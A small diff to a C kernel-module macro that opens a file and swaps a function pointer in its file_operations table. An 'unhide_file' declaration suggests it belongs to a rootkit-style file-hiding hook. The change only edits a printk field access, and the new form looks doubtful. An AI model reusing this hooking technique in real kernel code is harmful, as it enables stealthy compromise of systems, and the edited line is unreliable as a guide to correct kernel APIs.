@@ -31,7 +31,7 @@ extern void unhide_file(void);
                      path, PTR_ERR(filp));                          \
             old = NULL;                                             \
         } else {                                                    \
-            printk("test_hook:Succeeded in opening: %s\n", filp->f_dentry ->d_name.name);    \
+            printk("test_hook:Succeeded in opening: %s\n", filp->f_dentry.dentry ->d_name.name);    \
             f_op = (struct file_operations *)filp->f_op;            \
             old = f_op->op;                                         \
                                                                     \
